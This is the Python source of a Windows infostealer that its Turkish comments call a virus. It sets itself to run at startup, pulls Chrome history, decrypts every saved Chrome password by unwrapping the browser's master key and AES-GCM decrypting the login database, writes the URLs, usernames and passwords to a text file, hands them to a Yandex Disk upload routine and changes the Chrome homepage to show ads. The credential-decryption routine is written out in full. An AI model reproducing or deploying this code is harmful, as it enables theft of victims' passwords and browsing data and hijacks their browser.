from chrome import q1
from history import q2
from yadiskk import q4
from begin import q5
import requests
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def start():
    #Virüsün Başlatıldığı Fonksiyon
    #Sırasıyla internete bağlı olup olmadığımızı kontrol ediyoruz
    #printin içindeki yazılardan anlaşılacağı üzere içindeki işlemler sırasıyla yapılıyor
    res = requests.get('https://google.com/')
    if (res.status_code):
        q5()
        print("Baslangic Eklendi")
        q2()
        print("Chrome Gecmisi Cekildi")
        q3()
        print("Chrome Sifreleri Cekildi")
        q4()
        print("Yandex Diske Aktarildi")
        q1()
        print("Chrome anasayfa degisti - Reklam Acildi")

        
    else:
        print("not connected")
def q3():
    #kaydedeceğim şifreler için dosya olup olmadığını kontrol ediyorum
    data_path = os.path.expanduser('~')+"\\Settings"
    data_user_password=os.path.expanduser('~')[9:]+"-Password"
    data_txt_path = os.path.expanduser('~')+"\\Settings\\"+data_user_password+".txt"
    if not os.path.exists(data_path):
            os.makedirs(data_path)
    if os.path.exists(data_path):
            f=open(data_txt_path,"a")
            f=open(data_txt_path,"r+")
            f.truncate(0)
    
    

    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        
        return master_key


    def decrypt_payload(cipher, payload):
        
        return cipher.decrypt(payload)
        


    def generate_cipher(aes_key, iv):
        
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password(buff, master_key):
        
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"



    if __name__ == '__main__':
        #Chromeun şifreleri tutduğu dizin
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data For Account'
        data_user_name=os.path.expanduser('~')[9:]
        data_db_path = os.path.expanduser('~')+"\\Settings\\"+data_user_name+"-db"
        #başlangıçta genelde chrome kendini kilitler yada otomatik açılır bu yüzden şifreleri başka bir dizine kopyalıyoruz
        if os.path.exists(data_db_path):
            os.remove(data_db_path)
        shutil.copy2(login_db, data_db_path)
        #şifreyi içeren şifrelenmiş dosyayı açıyoruz
        conn = sqlite3.connect(data_db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
#kullanıcı adı şifre ve hangi siteden girdiğini tek tek txt dosyasına yazıyorum her virüs çalıştığında geçmiş güncellerek işleniyor
                text_file = open(data_txt_path, "a")
                text_file.writelines("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "_" * 50 + "\n")
                text_file.close()
                
        except Exception as e:
            pass

        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
start()


